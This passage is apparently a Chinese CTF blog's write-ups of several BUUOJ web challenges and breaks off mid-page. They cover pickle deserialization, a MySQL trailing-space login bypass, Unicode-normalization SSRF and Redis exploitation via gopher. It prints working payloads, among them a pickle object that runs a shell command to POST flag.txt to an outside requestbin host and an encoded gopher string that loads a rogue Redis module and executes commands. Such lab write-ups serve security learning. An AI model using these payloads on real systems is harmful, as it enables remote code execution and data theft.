class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span>(<span class=\"params\">object</span>):</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__reduce__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (os.system,(<span class=\"string\">&#x27;ls&#x27;</span>,))</span><br><span class=\"line\">print(base64.b64encode(pickle.dumps(evil())))</span><br></pre></td></tr></table></figure> 把Cookies替换了，发现500了。我们把ls换成sleep 10看看。发现确实是停了10s才返回500。我们的命令成功执行了，没回显，那就弹shell了。BUUOJ下弹shell有点难，试一下这个环境有没有curl吧，配合HTTPRequestBin。发现可行，同时flag.txt在当前目录下。 <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span>(<span class=\"params\">object</span>):</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__reduce__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (os.system,(<span class=\"string\">&#x27;curl -X POST --data &quot;test=`cat flag.txt`&quot; http://http.requestbin.buuoj.cn/19tec0n1&#x27;</span>,))</span><br><span class=\"line\">print(base64.b64encode(pickle.dumps(evil())))</span><br></pre></td></tr></table></figure> 就拿到flag了。</p>\r\n\n    <div id=\"aplayer-iDfrckkk\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"1062642\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{83e228ed-71f1-4a62-834e-23d9ea42b430}</p>\r\n","categories":["Writeups"],"tags":["Web","Python","Pickle"]},{"title":"BUUOJ刷题-Web-Products Manager","url":"/2020/03/01/BUUOJ%E5%88%B7%E9%A2%98-Web-Products-Manager/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>FaceBook CTF 2019的Products Manager。给了源码，猜测是SQL注入的题。</p>\r\n<p>开题允许我们查看Top 5的Products，添加自己的商品，或者查看其他人的商品详情，但是需要输入密码。那么盲猜flag在某个商品详情里面。</p>\r\n<p>看一下源码，db.php告诉我们flag在facebook商品里面，我们需要拿到它的密码。db.php包含数据区读写操作，所有的SQL语句都使用了prepare，看来SQL注入废了。我们重点看一下view.php。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handle_post</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">global</span> $_POST;</span><br><span class=\"line\"></span><br><span class=\"line\">  $name = $_POST[<span class=\"string\">&quot;name&quot;</span>];</span><br><span class=\"line\">  $secret = $_POST[<span class=\"string\">&quot;secret&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($name) &amp;&amp; $name !== <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        &amp;&amp; <span class=\"keyword\">isset</span>($secret) &amp;&amp; $secret !== <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (check_name_secret($name, hash(<span class=\"string\">&#x27;sha256&#x27;</span>, $secret)) === <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"string\">&quot;Incorrect name or secret, please try again&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $product = get_product($name);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Product details:&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;ul&gt;&lt;li&gt;&quot;</span> . htmlentities($product[<span class=\"string\">&#x27;name&#x27;</span>]) . <span class=\"string\">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;li&gt;&quot;</span> . htmlentities($product[<span class=\"string\">&#x27;description&#x27;</span>]) . <span class=\"string\">&quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 过了check_name_secret()后会调用get_product()获得商品信息。问题来了，get_product()里的SQL语句是这么写的<code>SELECT name, description FROM products WHERE name = ?</code>，而name在MySQL中是char(64)类型，对MySQL而言，char和varchar类型有个奇怪的特性。 <blockquote><p>All MySQL collations are of type PAD SPACE. This means that all CHAR, VARCHAR, and TEXT values are compared without regard to any trailing spaces. “Comparison” in this context does not include the LIKE pattern-matching operator, for which trailing spaces are significant.</p>\r\n<footer><strong>https://dev.mysql.com/doc/refman/5.7/en/char.html</strong></footer></blockquote></p>\r\n<p>使用=比较的时候MySQL会忽略掉字符串后面的空格，所以如果我们传入'facebook '，SQL语句变成<code>select name,description from products where name='facebook     ';</code>对MySQL而言，等同于<code>select name,description from products where name='facebook';</code>，所以，我们在add.php的handle_post()里传入'facebook '，会先进行get_product()，而get_product()错误的返回了'facebook'的数据，因此可以通过重名的检查从而插入了一条'facebook '的数据。当我们view的时候，会过check_name_secret()，仍然使用=比较：<code>SELECT name FROM products WHERE name = ? AND secret = ?</code>，MySQL认为'facebook'与'facebook '是相同的，因此secret为我们设置的值时select正常返回，这样就可以绕过facebook的secret了。但是get_product()的时候只会返回'facebook'的结果，不会返回'facebook '的结果。</p>\r\n<p>所以，Add一个'facebook '的Product，secret任意设置。然后view，名称填'facebook'，secret为刚才设置的值，即可拿到flag。</p>\r\n\n    <div id=\"aplayer-DFAdmdKU\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"28315111\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{246d6062-dca6-4de4-adbb-5f5a3770b9e6}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web"]},{"title":"BUUOJ刷题-Web-Pythonginx","url":"/2019/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-Pythonginx/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>SUCTF 2019的Pythonginx。</p>\r\n<p>打开页面就给了源码。要求提交的URL里经过parse.urlparse的处理，hostname为suctf.cc，urlsplit处理后第二部分返回的也是suctf.cc，然后按.分割，idna编码再解码成UTF-8后再组合，要求urlparse的hostname还是suctf.cc，那么就会进行SSRF。 <a id=\"more\"></a> 这道题涉及到一个最近的议题<a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\">这个</a>和<a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-wp.pdf\">这个</a>。简单来说，就是URL包含Unicode字符时会转成Punycode，转换的时候会对Unicode字符额外编码(IDNA)，但有的Unicode字符转IDNA的时候已经解释成正常ASCII字符了，Punycode就不会进行。上述的Unicode字符中有些包含<code>/</code>，就会对网址的含义造成影响。如\"℀\"(U+2100)，转换的时候就变成了<code>a/c</code>，造成URL的切割。<code>www.f℀ke.microsoft.com</code>，就会变成<code>www.fa/cke.microsoft.com</code>，域名发生变化。</p>\r\n<p>PPT的第36页就是题目中的代码。因此我们如法炮制，构造一个特殊URL造成<code>/</code>的出现。我们的目标是<code>file://suctf.cc/?</code>，最后一个c后出现<code>/</code>和一个我们想要的字符。那么我们来遍历一下U你code字符集吧。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> unicodedata</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0x0000</span>,<span class=\"number\">0xffff</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&quot;/&quot;</span> <span class=\"keyword\">in</span> unicodedata.normalize(<span class=\"string\">&quot;NFKC&quot;</span>,chr(i)):</span><br><span class=\"line\">        print(i,chr(i))</span><br></pre></td></tr></table></figure>\r\n<p>出乎意料的，返回的结果并不多。</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">47 &#x2F;</span><br><span class=\"line\">8448 ℀</span><br><span class=\"line\">8449 ℁</span><br><span class=\"line\">8453 ℅</span><br><span class=\"line\">8454 ℆</span><br><span class=\"line\">65295 ／</span><br></pre></td></tr></table></figure>\r\n<p>而其中8453和8454的结果是我们想要的。那么下一步是我们读什么文件？注意到本题用的Web服务器是Openresty，Lua+Nginx，那么我们猜一下读nginx的配置文件吧。</p>\r\n<p><a href=\"http://233bff3e-839d-4464-a0c6-6e36ee1325d3.node1.buuoj.cn/getUrl?url=file%3A%2F%2Fsuctf.c℆sr%2Flocal%2Fnginx%2Fconf%2Fnginx.conf\">http://233bff3e-839d-4464-a0c6-6e36ee1325d3.node1.buuoj.cn/getUrl?url=file%3A%2F%2Fsuctf.c%E2%84%86sr%2Flocal%2Fnginx%2Fconf%2Fnginx.conf</a></p>\r\n<p>返回<code>server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; # location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</code></p>\r\n<p>那么直接读/usr/fffffflag就好了。</p>\r\n<p>上面的Unicode字符查找方式是完全按照Paper来的。其实我们可以放开限制，只要suctf.cc的最后一个c在IDNA编码后是ASCII c即可。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> urllib.parse <span class=\"keyword\">import</span> urlparse,urlunsplit,urlsplit</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_unicode</span>():</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">65536</span>):</span><br><span class=\"line\">\t\tuni=chr(x)</span><br><span class=\"line\">\t\turl=<span class=\"string\">&quot;http://suctf.c&#123;&#125;&quot;</span>.format(uni)</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> getUrl(url):</span><br><span class=\"line\">\t\t\t\tprint(<span class=\"string\">&quot;str: &quot;</span>+uni+<span class=\"string\">&#x27; unicode: \\\\u&#x27;</span>+str(hex(x))[<span class=\"number\">2</span>:])</span><br><span class=\"line\">\t\t<span class=\"keyword\">except</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getUrl</span>(<span class=\"params\">url</span>):</span></span><br><span class=\"line\">    url = url</span><br><span class=\"line\">    host = parse.urlparse(url).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">&#x27;suctf.cc&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    parts = list(urlsplit(url))</span><br><span class=\"line\">    host = parts[<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">&#x27;suctf.cc&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    newhost = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> host.split(<span class=\"string\">&#x27;.&#x27;</span>):</span><br><span class=\"line\">        newhost.append(h.encode(<span class=\"string\">&#x27;idna&#x27;</span>).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">    parts[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;.&#x27;</span>.join(newhost)</span><br><span class=\"line\">    finalUrl = urlunsplit(parts).split(<span class=\"string\">&#x27; &#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    host = parse.urlparse(finalUrl).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">&#x27;suctf.cc&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\tget_unicode()</span><br></pre></td></tr></table></figure>\r\n<p>同样可以找到合适的Unicode字符。</p>\r\n\n    <div id=\"aplayer-ONznbIUM\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"421203362\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{82faae26-4da6-4cf1-b8fc-37dfdd7790f04}</p>\r\n","categories":["Writeups"],"tags":["Web","BUUOJ","Python","Unicode"]},{"title":"BUUOJ刷题-Web-SSRFMe","url":"/2020/07/16/BUUOJ%E5%88%B7%E9%A2%98-Web-SSRFMe/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>2020年网鼎杯玄武组的SSRFMe。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_inner_ip</span>(<span class=\"params\">$url</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $match_result=preg_match(<span class=\"string\">&#x27;/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/&#x27;</span>,$url);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!$match_result)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;url fomat error&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $url_parse=parse_url($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span>(<span class=\"built_in\">Exception</span> $e)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;url fomat error&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $hostname=$url_parse[<span class=\"string\">&#x27;host&#x27;</span>];</span><br><span class=\"line\">    $ip=gethostbyname($hostname);</span><br><span class=\"line\">    $int_ip=ip2long($ip);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ip2long(<span class=\"string\">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class=\"number\">24</span> == $int_ip&gt;&gt;<span class=\"number\">24</span> || ip2long(<span class=\"string\">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class=\"number\">24</span> == $int_ip&gt;&gt;<span class=\"number\">24</span> || ip2long(<span class=\"string\">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class=\"number\">20</span> == $int_ip&gt;&gt;<span class=\"number\">20</span> || ip2long(<span class=\"string\">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class=\"number\">16</span> == $int_ip&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe_request_url</span>(<span class=\"params\">$url</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (check_inner_ip($url))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $url.<span class=\"string\">&#x27; is inner ip&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $result_info = curl_getinfo($ch);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($result_info[<span class=\"string\">&#x27;redirect_url&#x27;</span>])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            safe_request_url($result_info[<span class=\"string\">&#x27;redirect_url&#x27;</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\">        var_dump($output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;url&#x27;</span>]))&#123;</span><br><span class=\"line\">    $url = $_GET[<span class=\"string\">&#x27;url&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($url))&#123;</span><br><span class=\"line\">        safe_request_url($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// Please visit hint.php locally.</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> 很明显，SSRF，还涉及parse_url和curl的问题。先看check_inner_ip。协议要http https pogher dict，然后用parse_url得到host，gethostbyname把域名转成IP。然后用ip2long判断IP是否属于127.*.*.* 172.16.*.*-172.32.*.* 192.168.*.*范围，是则认为是内部地址。然而本地要求不能是本地IP，但是hint.php又要求是本地IP访问。 如何绕过？有两种思路：一是利用DNS Rebinding。让域名在check_inner_ip的时候为外部地址，而curl请求的时候又变成内部IP。有<a href=\"https://lock.cmpxchg8b.com/rebinder.html\">平台</a>可以做到，但是会随机变化，要多打几次。二是利用一个特殊IP：0.0.0.0。这个IP在配服务的时候应该见过。在服务端被视为任意IP地址，包括服务自身的地址。因此我们把IP设成0.0.0.0就可以了。</p>\r\n<p>直接访问http://9bcb67ea-7fa8-4be8-857b-2599bad85b16.node3.buuoj.cn/?url=http://0.0.0.0/hint.php。得到hint.php内容：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SERVER[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>]===<span class=\"string\">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;file&#x27;</span>]))&#123;</span><br><span class=\"line\">  file_put_contents($_POST[<span class=\"string\">&#x27;file&#x27;</span>],<span class=\"string\">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.$_POST[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>内网Redis，Gopher协议。对付Redis，一般几种方向：写ssh密钥，写crontab，写Shell，以及最新爆出来的主从复制。先试一下写文件，Gopher的payload有点长，不想手动抓包，直接用<a href=\"https://github.com/tarunkant/Gopherus\">工具</a>。发现ssh crontab shell都失败了，只能主从复制了。</p>\r\n<p>这次要用到<a href=\"https://github.com/n0b0dyCN/redis-rogue-server\">这个</a>的exp.so和<a href=\"https://github.com/xmsec/redis-ssrf\">这个</a>。BUU环境下我们还需要一台靶机当Rogue Server。修改ssrf-redis.py，改一下IP地址和命令，配套的rogue-server.py默认监听6666端口，就不改了，然后运行生成payload。注意由于要过curl，需要二次URL编码。</p>\r\n<p>然后访问<code>http://9bcb67ea-7fa8-4be8-857b-2599bad85b16.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/%5f%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%37%25%30%44%25%30%41%53%4c%41%56%45%4f%46%25%30%44%25%30%41%25%32%34%31%32%25%30%44%25%30%41%31%37%34%2e%32%2e%37%32%2e%31%33%35%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%36%36%36%36%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%43%4f%4e%46%49%47%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%53%45%54%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%35%25%30%44%25%30%41%2f%74%6d%70%2f%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%4d%4f%44%55%4c%45%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%4c%4f%41%44%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%2f%74%6d%70%2f%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%32%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%73%79%73%74%65%6d%2e%65%78%65%63%25%30%44%25%30%41%25%32%34%31%34%25%30%44%25%30%41%63%61%74%25%32%34%25%37%42%49%46%53%25%37%44%2f%66%6c%61%67%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%71%75%69%74%25%30%44%25%30%41</code>即可。注意要先访问一遍进行同步，然后才可以执行命令。由于rogue-server.py不等待同步完成就退出，可能造成exp.so没有传完就结束了，所以需要一个死循环反复执行。</p>\r\n<p>https://lock.cmpxchg8b.com/rebinder.html \n    <div id=\"aplayer-EOPQNhVj\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"28109228\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div></p>\r\n<p>flag{e7cfe6b7-db69-4a88-8889-fa7fc11e538c}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ","Redis","SSRF"]},{"title":"BUUOJ刷题-Web-SimplePHP","url":"/2019/10/28/BUUOJ%E5%88%B7%E9%A2%98-Web-SimplePHP/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>SWPU 2018 CTF的SimplePHP。</p>\r\n<p>给了个查看文件和上传文件，扫目录似乎没结果。然后发现“查看文件”的URL有点东西<code>http://ed97c7d0-1d36-4255-852f-e4b73a9fbd2b.node3.buuoj.cn/file.php?file=</code>，LFI试一下。行吧，直接show_source了。 <a id=\"more\"></a> <figure class=\"highlight php\"><figcaption><span>index.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">header(<span class=\"string\">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;base.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure> <figure class=\"highlight php\"><figcaption><span>file.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">header(<span class=\"string\">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;function.php&#x27;</span>; </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;class.php&#x27;</span>; </span><br><span class=\"line\">ini_set(<span class=\"string\">&#x27;open_basedir&#x27;</span>,<span class=\"string\">&#x27;/var/www/html/&#x27;</span>); </span><br><span class=\"line\">$file = $_GET[<span class=\"string\">&quot;file&quot;</span>] ? $_GET[<span class=\"string\">&#x27;file&#x27;</span>] : <span class=\"string\">&quot;&quot;</span>; </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($file)) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">$show = <span class=\"keyword\">new</span> Show(); </span><br><span class=\"line\"><span class=\"keyword\">if</span>(file_exists($file)) &#123; </span><br><span class=\"line\">    $show-&gt;source = $file; </span><br><span class=\"line\">    $show-&gt;_show(); </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($file))&#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;file doesn\\&#x27;t exists.&#x27;</span>); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure> <figure class=\"highlight php\"><figcaption><span>upload_file.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;function.php&#x27;</span>; </span><br><span class=\"line\">upload_file(); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br><span class=\"line\">&lt;html&gt; </span><br><span class=\"line\">&lt;head&gt; </span><br><span class=\"line\">&lt;meta charest=<span class=\"string\">&quot;utf-8&quot;</span>&gt; </span><br><span class=\"line\">&lt;title&gt;文件上传&lt;/title&gt; </span><br><span class=\"line\">&lt;/head&gt; </span><br><span class=\"line\">&lt;body&gt; </span><br><span class=\"line\">&lt;div align = <span class=\"string\">&quot;center&quot;</span>&gt; </span><br><span class=\"line\">        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; </span><br><span class=\"line\">&lt;/div&gt; </span><br><span class=\"line\">&lt;style&gt; </span><br><span class=\"line\">    p&#123; margin:<span class=\"number\">0</span> auto&#125; </span><br><span class=\"line\">&lt;/style&gt; </span><br><span class=\"line\">&lt;div&gt; </span><br><span class=\"line\">&lt;form action=<span class=\"string\">&quot;upload_file.php&quot;</span> method=<span class=\"string\">&quot;post&quot;</span> enctype=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt; </span><br><span class=\"line\">    